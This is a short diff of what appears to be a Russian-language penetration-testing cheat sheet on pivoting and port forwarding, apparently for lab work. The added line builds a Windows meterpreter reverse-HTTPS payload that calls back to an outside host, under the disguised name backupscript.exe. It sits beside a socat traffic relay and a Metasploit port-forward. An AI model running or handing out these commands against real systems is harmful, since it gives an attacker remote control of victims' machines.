@@ -447,6 +447,8 @@ route add 10.10.10.0/23 mask 255.255.254.0 192.168.50.123
 		на промежуточном хосте слушаем 8080 и перенаправляем весь трафик на свой хост на 8001 порт
 		socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:8001
 
+		msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+		
 # Проброс портов Metasploit
 	
  	portfwd add -l 3306 -r 127.0.0.1 -p 14406
